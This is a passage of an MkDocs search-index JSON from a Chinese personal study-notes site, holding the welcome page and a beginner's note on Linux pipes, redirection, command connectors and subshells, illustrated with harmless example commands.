{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to Curren's Notes # \u6b22\u8fce\u6765\u5230\u6211\u7684\u5b66\u4e60\u7b14\u8bb0\u8bb0\u5f55\u7ad9 # \u6211\u4ece2020\u5e742\u67087\u65e5\u5f00\u59cb\u5728\u6b64\u8bb0\u5f55\u81ea\u5df1\u7684\u8003\u7814\\\u8bfe\u7a0b\\\u8bfb\u4e66\u548c\u5de5\u5177\u4f7f\u7528\u7b14\u8bb0\u3002 \u672c\u7ad9\u70b9\u4f7f\u7528 Mkdocs \u642d\u5efa\uff0c\u52a0\u5165\u4e86\u4e00\u4e9b\u4ee3\u7801\u9ad8\u4eae\u3001\u751f\u6210\u601d\u7ef4\u5bfc\u56fe\u3001\u751f\u6210UML\u56fe\u7b49\u7b49\u7684 Javascript \u7ec4\u4ef6\u3002 \u5982\u4f55\u4f7f\u7528\u672c\u7ad9 # \u5982\u679c\u4f60\u662f\u8003\u7814\u5b66\u5b50\uff0c\u6b22\u8fce\u6d4f\u89c8\u6211\u7684 \u8003\u7814\u7b14\u8bb0 \u3002 \u5982\u679c\u4f60\u4e5f\u662f\u8ba1\u7b97\u673a\u4e16\u754c\u7684\u5b66\u4e60\u8005\uff0c\u6b22\u8fce\u6d4f\u89c8\u6211\u7684 \u8bfe\u7a0b\u7b14\u8bb0 \u3001 \u5de5\u5177\u4f7f\u7528\u7b14\u8bb0 \u548c \u7b97\u6cd5\u5b66\u4e60\u7b14\u8bb0 \u3002 \u5982\u679c\u4f60\u4e5f\u662f\u8bfb\u4e66\u7231\u597d\u8005\uff0c\u6b22\u8fce\u6d4f\u89c8\u6211\u7684 \u8bfb\u4e66\u7b14\u8bb0 \u3002 \u4e3a\u4ec0\u4e48\u4f1a\u505a\u8fd9\u4e2a\u7ad9\u70b9 # \u8bb0\u5f55 \uff1a\u6211\u5e0c\u671b\u80fd\u591f\u6574\u7406\u81ea\u5df1\u6240\u5b66\u7684\u77e5\u8bc6\uff0c\u5e76\u5f62\u6210\u7d22\u5f15\uff0c\u5728\u9700\u8981\u7528\u5230\u7684\u65f6\u5019\u80fd\u591f\u5feb\u901f\u8fdb\u884c\u67e5\u9605\u3002 \u4f20\u64ad \uff1a\u540c\u65f6\uff0c\u4ee5\u7f51\u9875\u8fd9\u6837\u4e00\u4e2a\u53ef\u4ee5\u591a\u7aef\u8bbf\u95ee\u7684\u8f7d\u4f53\u8fdb\u884c\u8bb0\u5f55\uff0c\u6211\u7684\u4e00\u70b9\u70b9\u7ecf\u9a8c\u4e5f\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u8fdb\u884c\u4f20\u64ad\u3002 \u4e0a\u9762\u7684\u4e24\u70b9\u5f53\u7136\u662f\u6211\u5728\u505a\u8fd9\u4e2a\u7ad9\u70b9\u7684\u8fc7\u7a0b\u4e2d\u603b\u7ed3\u51fa\u6765\u7684\u3002\u5176\u5b9e\u6700\u5f00\u59cb\u6211\u662f\u5e0c\u671b\u80fd\u591f\u4e3a\u81ea\u5df1\u7684\u8003\u7814\u63d0\u4f9b\u4e00\u4e9b\u4fbf\u5229\u3002\u6211\u8ba4\u4e3a\uff0c\u7eb8\u8d28\u7684\u7b14\u8bb0\u672c\u5728\u6574\u7406\u6bd4\u8f83\u591a\u7684\u77e5\u8bc6\u5185\u5bb9\u65f6\uff0c\u5bf9\u6211\u6765\u8bf4\u662f\u5f88\u4e0d\u53cb\u597d\u7684\u3002\u4e3b\u8981\u7684\u539f\u56e0\u5982\u4e0b\uff1a \u8bb0\u5f55\u901f\u5ea6\u6162 \u4e0d\u65b9\u4fbf\u7d22\u5f15 \u4e0d\u65b9\u4fbf\u4fee\u6539 \u6240\u4ee5\uff0c\u6211\u5c06\u6211\u7684\u7b14\u8bb0\u901a\u8fc7 Markdown \u683c\u5f0f\u6574\u7406\u5230\u8fd9\u4e2a\u7ad9\u70b9\u4e2d\u3002 \u5728\u5f00\u59cb\u5199\u8003\u7814\u7b14\u8bb0\u4e4b\u540e\uff0c\u6211\u53c8\u60f3\u5230\uff0c\u65e2\u7136\u53ef\u4ee5\u628a\u8003\u7814\u7b14\u8bb0\u653e\u5728\u7f51\u7ad9\u4e0a\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u628a\u5176\u4ed6\u7684\u5b66\u4e60\u7b14\u8bb0\u4e5f\u653e\u8fdb\u6765\u5462\uff1f \u4e8e\u662f\uff0c\u5c31\u6709\u4e86\u4f60\u4eca\u5929\u770b\u5230\u7684\u8fd9\u4e2a\u7ad9\u70b9\u3002","title":"Welcome to Curren's Notes"},{"location":"#welcome-to-currens-notes","text":"","title":"Welcome to Curren's Notes"},{"location":"#_1","text":"\u6211\u4ece2020\u5e742\u67087\u65e5\u5f00\u59cb\u5728\u6b64\u8bb0\u5f55\u81ea\u5df1\u7684\u8003\u7814\\\u8bfe\u7a0b\\\u8bfb\u4e66\u548c\u5de5\u5177\u4f7f\u7528\u7b14\u8bb0\u3002 \u672c\u7ad9\u70b9\u4f7f\u7528 Mkdocs \u642d\u5efa\uff0c\u52a0\u5165\u4e86\u4e00\u4e9b\u4ee3\u7801\u9ad8\u4eae\u3001\u751f\u6210\u601d\u7ef4\u5bfc\u56fe\u3001\u751f\u6210UML\u56fe\u7b49\u7b49\u7684 Javascript \u7ec4\u4ef6\u3002","title":"\u6b22\u8fce\u6765\u5230\u6211\u7684\u5b66\u4e60\u7b14\u8bb0\u8bb0\u5f55\u7ad9"},{"location":"#_2","text":"\u5982\u679c\u4f60\u662f\u8003\u7814\u5b66\u5b50\uff0c\u6b22\u8fce\u6d4f\u89c8\u6211\u7684 \u8003\u7814\u7b14\u8bb0 \u3002 \u5982\u679c\u4f60\u4e5f\u662f\u8ba1\u7b97\u673a\u4e16\u754c\u7684\u5b66\u4e60\u8005\uff0c\u6b22\u8fce\u6d4f\u89c8\u6211\u7684 \u8bfe\u7a0b\u7b14\u8bb0 \u3001 \u5de5\u5177\u4f7f\u7528\u7b14\u8bb0 \u548c \u7b97\u6cd5\u5b66\u4e60\u7b14\u8bb0 \u3002 \u5982\u679c\u4f60\u4e5f\u662f\u8bfb\u4e66\u7231\u597d\u8005\uff0c\u6b22\u8fce\u6d4f\u89c8\u6211\u7684 \u8bfb\u4e66\u7b14\u8bb0 \u3002","title":"\u5982\u4f55\u4f7f\u7528\u672c\u7ad9"},{"location":"#_3","text":"\u8bb0\u5f55 \uff1a\u6211\u5e0c\u671b\u80fd\u591f\u6574\u7406\u81ea\u5df1\u6240\u5b66\u7684\u77e5\u8bc6\uff0c\u5e76\u5f62\u6210\u7d22\u5f15\uff0c\u5728\u9700\u8981\u7528\u5230\u7684\u65f6\u5019\u80fd\u591f\u5feb\u901f\u8fdb\u884c\u67e5\u9605\u3002 \u4f20\u64ad \uff1a\u540c\u65f6\uff0c\u4ee5\u7f51\u9875\u8fd9\u6837\u4e00\u4e2a\u53ef\u4ee5\u591a\u7aef\u8bbf\u95ee\u7684\u8f7d\u4f53\u8fdb\u884c\u8bb0\u5f55\uff0c\u6211\u7684\u4e00\u70b9\u70b9\u7ecf\u9a8c\u4e5f\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u8fdb\u884c\u4f20\u64ad\u3002 \u4e0a\u9762\u7684\u4e24\u70b9\u5f53\u7136\u662f\u6211\u5728\u505a\u8fd9\u4e2a\u7ad9\u70b9\u7684\u8fc7\u7a0b\u4e2d\u603b\u7ed3\u51fa\u6765\u7684\u3002\u5176\u5b9e\u6700\u5f00\u59cb\u6211\u662f\u5e0c\u671b\u80fd\u591f\u4e3a\u81ea\u5df1\u7684\u8003\u7814\u63d0\u4f9b\u4e00\u4e9b\u4fbf\u5229\u3002\u6211\u8ba4\u4e3a\uff0c\u7eb8\u8d28\u7684\u7b14\u8bb0\u672c\u5728\u6574\u7406\u6bd4\u8f83\u591a\u7684\u77e5\u8bc6\u5185\u5bb9\u65f6\uff0c\u5bf9\u6211\u6765\u8bf4\u662f\u5f88\u4e0d\u53cb\u597d\u7684\u3002\u4e3b\u8981\u7684\u539f\u56e0\u5982\u4e0b\uff1a \u8bb0\u5f55\u901f\u5ea6\u6162 \u4e0d\u65b9\u4fbf\u7d22\u5f15 \u4e0d\u65b9\u4fbf\u4fee\u6539 \u6240\u4ee5\uff0c\u6211\u5c06\u6211\u7684\u7b14\u8bb0\u901a\u8fc7 Markdown \u683c\u5f0f\u6574\u7406\u5230\u8fd9\u4e2a\u7ad9\u70b9\u4e2d\u3002 \u5728\u5f00\u59cb\u5199\u8003\u7814\u7b14\u8bb0\u4e4b\u540e\uff0c\u6211\u53c8\u60f3\u5230\uff0c\u65e2\u7136\u53ef\u4ee5\u628a\u8003\u7814\u7b14\u8bb0\u653e\u5728\u7f51\u7ad9\u4e0a\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u628a\u5176\u4ed6\u7684\u5b66\u4e60\u7b14\u8bb0\u4e5f\u653e\u8fdb\u6765\u5462\uff1f \u4e8e\u662f\uff0c\u5c31\u6709\u4e86\u4f60\u4eca\u5929\u770b\u5230\u7684\u8fd9\u4e2a\u7ad9\u70b9\u3002","title":"\u4e3a\u4ec0\u4e48\u4f1a\u505a\u8fd9\u4e2a\u7ad9\u70b9"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/","text":"Linux\u4e2d\u7684\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7 # \u76ee\u5f55 # Linux\u4e2d\u7684\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7 \u76ee\u5f55 1. \u80cc\u666f 2. \u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411 2.1. \u7ba1\u9053\u7b26\u53f7 | 2.2. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 &gt; 2.3. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 &gt;&gt; 2.4. \u8f93\u5165\u91cd\u5b9a\u5411\u7b26\u53f7 &lt; 3. \u8fde\u63a5\u7b26\u53f7 3.1. \u8fde\u63a5\u7b26\u53f7 ; 3.2. \u540e\u53f0\u6267\u884c\u7b26\u53f7 &amp; 3.3. \u903b\u8f91\u4e0e\u7b26\u53f7 &amp;&amp; 3.4. \u903b\u8f91\u6216\u7b26\u53f7 || 4. \u5b50\u547d\u4ee4\u7b26\u53f7 4.1. \u5b50\u547d\u4ee4\u7b26\u53f7 () 4.2. \u8868\u8fbe\u5f0f\u8ba1\u7b97\u7b26\u53f7 (()) 1. \u80cc\u666f # \u6700\u8fd1\u5728\u5b66\u4e60Linux\u4e2d\u7684\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u8fdb\u884c\u603b\u7ed3\u3002 2. \u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411 # 2.1. \u7ba1\u9053\u7b26\u53f7 | # Command A | Command B \u5c06\u524d A \u547d\u4ee4\u7684\u8f93\u51fa\u4f5c\u4e3a B \u547d\u4ee4\u7684\u8f93\u5165\u3002 \u5e38\u4e0e\u7b5b\u9009\u547d\u4ee4 grep \u642d\u914d\u4f7f\u7528\uff0c\u5982 ps aux | grep mysql \u5728\u6240\u6709\u8fdb\u7a0b\u4e2d\u67e5\u8be2\u542b\u6709 mysql \u5173\u952e\u5b57\u7684\u4fe1\u606f\u3002 ps aux | grep mysql | less \u8fd8\u53ef\u4ee5\u5c06\u8f93\u5165\u5bfc\u5165 less \u547d\u4ee4\uff0c less \u662f\u4e00\u4e2a\u5206\u9875\u5de5\u5177\uff0c\u5b83\u5141\u8bb8\u4f60\u4e00\u9875\u4e00\u9875\u5730\u67e5\u770b\u4fe1\u606f\u3002 2.2. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 > # Command A > File B \u5c06\u524d A \u547d\u4ee4\u7684\u8f93\u51fa\u5199\u5165 B \u6587\u4ef6\uff0c\u8986\u76d6\u539f\u6587\u4ef6\u5185\u5bb9\u3002 \u5982\u5728 hello.txt \u4e2d\u5199\u5165 Hello World! \u3002 echo Hello World! > hello.txt 2.3. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 >> # Command A >> File B \u5c06\u524d A \u547d\u4ee4\u7684\u8f93\u51fa\u8ffd\u52a0\u5199\u5165 B \u6587\u4ef6\uff0c\u4e0d\u8986\u76d6\u539f\u6587\u4ef6\u7684\u5185\u5bb9\u3002 echo Hello World! >> hello.txt \u5c06 Hello World! \u8ffd\u52a0\u5230 hello.txt \u540e\u9762\u3002 \u6ce8\uff1a cat hello.txt >> hello.txt \u4f1a\u5bfc\u81f4\u65e0\u9650\u5faa\u73af\u3002 2.4. \u8f93\u5165\u91cd\u5b9a\u5411\u7b26\u53f7 < # Command A < File B \u5c06 B \u6587\u4ef6\u7684\u5185\u5bb9\u4f5c\u4e3a\u547d\u4ee4 A \u7684\u8f93\u5165\u3002 \u5148\u521b\u5efa Python \u6587\u4ef6 test.py \uff0c\u529f\u80fd\u4e3a\u8f93\u51fa\u7528\u6237\u8f93\u51fa\u7684\u5185\u5bb9\u3002 echo 'print(input())' > test.py \u5c06 hello.txt \u4f5c\u4e3a test.py \u7684\u8f93\u5165\u3002 python test.py < hello.txt \u7ed3\u679c\u4f1a\u8f93\u51fa Hello World! \u3002 3. \u8fde\u63a5\u7b26\u53f7 # 3.1. \u8fde\u63a5\u7b26\u53f7 ; # Command A ; Command B \u5728\u4e00\u884c\u5199\u5165\u591a\u4e2a\u547d\u4ee4\u65f6\uff0c\u4f7f\u7528 ; \u8fdb\u884c\u5206\u5272\uff0c\u4e0d\u8bba A \u547d\u4ee4\u662f\u5426\u6267\u884c\u6210\u529f\uff0c B \u547d\u4ee4\u90fd\u4f1a\u7ee7\u7eed\u6267\u884c\u3002 \u6bd4\u5982\u4e0b\u9762\u7684\u547d\u4ee4\uff0cA\u547d\u4ee4\u6267\u884c\u5931\u8d25\uff0cB\u547d\u4ee4\u6267\u884c\u6210\u529f\u3002 ee ; echo Hello World! \u8f93\u51fa\u4e3a zsh: command not found: ee Hello World! 3.2. \u540e\u53f0\u6267\u884c\u7b26\u53f7 & # Command A & \u547d\u4ee4 A \u4f1a\u8fdb\u5165\u540e\u53f0\u6267\u884c\uff0c\u5f53\u7528\u4e8e\u6302\u8f7d\u540e\u53f0\u670d\u52a1\uff0c\u6216\u6267\u884c\u8017\u65f6\u4efb\u52a1\u65f6\u53ef\u80fd\u4f1a\u7528\u5230\u3002 \u5982\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\uff0c\u572860\u79d2\u540e\u7ed3\u675f\u3002 sleep 60 & \u547d\u4ee4\u884c\u4f1a\u8f93\u51fa [1] 51277 \uff0c\u8868\u793a\u8fdb\u7a0b\u7684 PID \u4e3a 51277 \uff0c60\u79d2\u540e\u4f1a\u8f93\u51fa [1] 51277 done sleep 60 \uff0c\u8868\u793a\u8fdb\u7a0b\u7ed3\u675f\u3002 3.3. \u903b\u8f91\u4e0e\u7b26\u53f7 && # Command A && Command B \u82e5 A \u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u7ee7\u7eed\u6267\u884c B \u547d\u4ee4\uff0c\u5426\u5219\u4e0d\u6267\u884c B \u547d\u4ee4\u3002 \u5982\u4e0b\u9762\u7684\u547d\u4ee4\u4f1a\u572860\u79d2\u540e\u8f93\u51fa Hello World! \u3002 sleep 60 && echo Hello World! \u800c\u63a5\u4e0b\u91cc\u8fd9\u6761\u547d\u4ee4\u53ea\u4f1a\u8f93\u51fa\u547d\u4ee4 A \u7684\u9519\u8bef\u4fe1\u606f\u3002 ee && echo Hello World! \u8f93\u51fa\u4e3a zsh: command not found: ee \u3002 3.4. \u903b\u8f91\u6216\u7b26\u53f7 || # Command A || Command B \u5982\u679c\u547d\u4ee4 A \u6267\u884c\u5931\u8d25\uff0c\u5219\u6267\u884c B \u3002 ee || echo Hello World! \u8f93\u51fa\u4e3a zsh: command not found: ee Hello World! 4. \u5b50\u547d\u4ee4\u7b26\u53f7 # 4.1. \u5b50\u547d\u4ee4\u7b26\u53f7 () # (Command A) \u521b\u5efa\u4e00\u4e2a\u5b50 shell \u53bb\u6267\u884c\u547d\u4ee4 A \uff0c\u5728 A \u4e2d\u5207\u6362\u6587\u4ef6\u5939\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d shell \u5de5\u4f5c\u8def\u5f84\u3002 (cd .. ; ls) \u8fd9\u6761\u547d\u4ee4\u4f1a\u8fd4\u56de\u4e0a\u5c42\u76ee\u5f55\u7684\u5185\u5bb9\uff0c\u4f46\u5de5\u4f5c\u8def\u5f84\u4ecd\u7136\u5728\u5f53\u524d\u76ee\u5f55\u3002 Command A $(Command B) \u8868\u793a\u8fd4\u56de\u547d\u4ee4 B \u7684\u7ed3\u679c\uff0c\u5e76\u5c06\u7ed3\u679c\u4f5c\u4e3a\u547d\u4ee4 A \u7684\u53c2\u6570\u7ee7\u7eed\u6267\u884c\u3002 $(echo echo) B \u8f93\u51fa\u4e3a B \u3002 echo A $(echo B) \u8f93\u51fa\u4e3a A B \u3002 4.2. \u8868\u8fbe\u5f0f\u8ba1\u7b97\u7b26\u53f7 (()) # ((Calculation A)) \u8ba1\u7b97\u8868\u8fbe\u5f0f A \u7684\u503c\u3002 \u5982\u679c\u8981\u4f5c\u4e3a\u53d8\u91cf\u7684\u8bdd\uff0c\u9700\u8981\u52a0\u4e0a $ \u3002\u5982 echo $((3+2)) \uff0c\u8f93\u51fa\u4e3a 5 \u3002 \u5e38\u4e0e if \u548c for \u547d\u4ee4\u914d\u5408\u4f7f\u7528\u3002 if ((3>2)) echo true for ((i=1;i<=16;i++));do echo $i; done \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#linux","text":"","title":"Linux\u4e2d\u7684\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#_1","text":"Linux\u4e2d\u7684\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7 \u76ee\u5f55 1. \u80cc\u666f 2. \u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411 2.1. \u7ba1\u9053\u7b26\u53f7 | 2.2. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 &gt; 2.3. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 &gt;&gt; 2.4. \u8f93\u5165\u91cd\u5b9a\u5411\u7b26\u53f7 &lt; 3. \u8fde\u63a5\u7b26\u53f7 3.1. \u8fde\u63a5\u7b26\u53f7 ; 3.2. \u540e\u53f0\u6267\u884c\u7b26\u53f7 &amp; 3.3. \u903b\u8f91\u4e0e\u7b26\u53f7 &amp;&amp; 3.4. \u903b\u8f91\u6216\u7b26\u53f7 || 4. \u5b50\u547d\u4ee4\u7b26\u53f7 4.1. \u5b50\u547d\u4ee4\u7b26\u53f7 () 4.2. \u8868\u8fbe\u5f0f\u8ba1\u7b97\u7b26\u53f7 (())","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#1","text":"\u6700\u8fd1\u5728\u5b66\u4e60Linux\u4e2d\u7684\u7ba1\u9053\u4e0e\u8fde\u63a5\u7b26\u53f7\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u8fdb\u884c\u603b\u7ed3\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#2","text":"","title":"2. \u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#21","text":"Command A | Command B \u5c06\u524d A \u547d\u4ee4\u7684\u8f93\u51fa\u4f5c\u4e3a B \u547d\u4ee4\u7684\u8f93\u5165\u3002 \u5e38\u4e0e\u7b5b\u9009\u547d\u4ee4 grep \u642d\u914d\u4f7f\u7528\uff0c\u5982 ps aux | grep mysql \u5728\u6240\u6709\u8fdb\u7a0b\u4e2d\u67e5\u8be2\u542b\u6709 mysql \u5173\u952e\u5b57\u7684\u4fe1\u606f\u3002 ps aux | grep mysql | less \u8fd8\u53ef\u4ee5\u5c06\u8f93\u5165\u5bfc\u5165 less \u547d\u4ee4\uff0c less \u662f\u4e00\u4e2a\u5206\u9875\u5de5\u5177\uff0c\u5b83\u5141\u8bb8\u4f60\u4e00\u9875\u4e00\u9875\u5730\u67e5\u770b\u4fe1\u606f\u3002","title":"2.1. \u7ba1\u9053\u7b26\u53f7 |"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#22-gt","text":"Command A > File B \u5c06\u524d A \u547d\u4ee4\u7684\u8f93\u51fa\u5199\u5165 B \u6587\u4ef6\uff0c\u8986\u76d6\u539f\u6587\u4ef6\u5185\u5bb9\u3002 \u5982\u5728 hello.txt \u4e2d\u5199\u5165 Hello World! \u3002 echo Hello World! > hello.txt","title":"2.2. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 &amp;gt;"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#23-gtgt","text":"Command A >> File B \u5c06\u524d A \u547d\u4ee4\u7684\u8f93\u51fa\u8ffd\u52a0\u5199\u5165 B \u6587\u4ef6\uff0c\u4e0d\u8986\u76d6\u539f\u6587\u4ef6\u7684\u5185\u5bb9\u3002 echo Hello World! >> hello.txt \u5c06 Hello World! \u8ffd\u52a0\u5230 hello.txt \u540e\u9762\u3002 \u6ce8\uff1a cat hello.txt >> hello.txt \u4f1a\u5bfc\u81f4\u65e0\u9650\u5faa\u73af\u3002","title":"2.3. \u8f93\u51fa\u91cd\u5b9a\u5411\u7b26\u53f7 &amp;gt;&amp;gt;"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#24-lt","text":"Command A < File B \u5c06 B \u6587\u4ef6\u7684\u5185\u5bb9\u4f5c\u4e3a\u547d\u4ee4 A \u7684\u8f93\u5165\u3002 \u5148\u521b\u5efa Python \u6587\u4ef6 test.py \uff0c\u529f\u80fd\u4e3a\u8f93\u51fa\u7528\u6237\u8f93\u51fa\u7684\u5185\u5bb9\u3002 echo 'print(input())' > test.py \u5c06 hello.txt \u4f5c\u4e3a test.py \u7684\u8f93\u5165\u3002 python test.py < hello.txt \u7ed3\u679c\u4f1a\u8f93\u51fa Hello World! \u3002","title":"2.4. \u8f93\u5165\u91cd\u5b9a\u5411\u7b26\u53f7 &amp;lt;"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#3","text":"","title":"3. \u8fde\u63a5\u7b26\u53f7"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#31","text":"Command A ; Command B \u5728\u4e00\u884c\u5199\u5165\u591a\u4e2a\u547d\u4ee4\u65f6\uff0c\u4f7f\u7528 ; \u8fdb\u884c\u5206\u5272\uff0c\u4e0d\u8bba A \u547d\u4ee4\u662f\u5426\u6267\u884c\u6210\u529f\uff0c B \u547d\u4ee4\u90fd\u4f1a\u7ee7\u7eed\u6267\u884c\u3002 \u6bd4\u5982\u4e0b\u9762\u7684\u547d\u4ee4\uff0cA\u547d\u4ee4\u6267\u884c\u5931\u8d25\uff0cB\u547d\u4ee4\u6267\u884c\u6210\u529f\u3002 ee ; echo Hello World! \u8f93\u51fa\u4e3a zsh: command not found: ee Hello World!","title":"3.1. \u8fde\u63a5\u7b26\u53f7 ;"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#32-amp","text":"Command A & \u547d\u4ee4 A \u4f1a\u8fdb\u5165\u540e\u53f0\u6267\u884c\uff0c\u5f53\u7528\u4e8e\u6302\u8f7d\u540e\u53f0\u670d\u52a1\uff0c\u6216\u6267\u884c\u8017\u65f6\u4efb\u52a1\u65f6\u53ef\u80fd\u4f1a\u7528\u5230\u3002 \u5982\u4e0b\u9762\u7684\u547d\u4ee4\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u540e\u53f0\u8fdb\u7a0b\uff0c\u572860\u79d2\u540e\u7ed3\u675f\u3002 sleep 60 & \u547d\u4ee4\u884c\u4f1a\u8f93\u51fa [1] 51277 \uff0c\u8868\u793a\u8fdb\u7a0b\u7684 PID \u4e3a 51277 \uff0c60\u79d2\u540e\u4f1a\u8f93\u51fa [1] 51277 done sleep 60 \uff0c\u8868\u793a\u8fdb\u7a0b\u7ed3\u675f\u3002","title":"3.2. \u540e\u53f0\u6267\u884c\u7b26\u53f7 &amp;amp;"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#33-ampamp","text":"Command A && Command B \u82e5 A \u547d\u4ee4\u6267\u884c\u6210\u529f\uff0c\u7ee7\u7eed\u6267\u884c B \u547d\u4ee4\uff0c\u5426\u5219\u4e0d\u6267\u884c B \u547d\u4ee4\u3002 \u5982\u4e0b\u9762\u7684\u547d\u4ee4\u4f1a\u572860\u79d2\u540e\u8f93\u51fa Hello World! \u3002 sleep 60 && echo Hello World! \u800c\u63a5\u4e0b\u91cc\u8fd9\u6761\u547d\u4ee4\u53ea\u4f1a\u8f93\u51fa\u547d\u4ee4 A \u7684\u9519\u8bef\u4fe1\u606f\u3002 ee && echo Hello World! \u8f93\u51fa\u4e3a zsh: command not found: ee \u3002","title":"3.3. \u903b\u8f91\u4e0e\u7b26\u53f7 &amp;amp;&amp;amp;"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#34","text":"Command A || Command B \u5982\u679c\u547d\u4ee4 A \u6267\u884c\u5931\u8d25\uff0c\u5219\u6267\u884c B \u3002 ee || echo Hello World! \u8f93\u51fa\u4e3a zsh: command not found: ee Hello World!","title":"3.4. \u903b\u8f91\u6216\u7b26\u53f7 ||"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#4","text":"","title":"4. \u5b50\u547d\u4ee4\u7b26\u53f7"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Linux/1.%E7%AE%A1%E9%81%93%E4%B8%8E%E8%BF%9E%E6%8E%A5%E7%AC%A6%E5%8F%B7/#41","text":"(Command A) \u521b\u5efa\u4e00\u4e2a\u5b50 shell \u53bb\u6267\u884c\u547d\u4ee4 A \uff0c\u5728 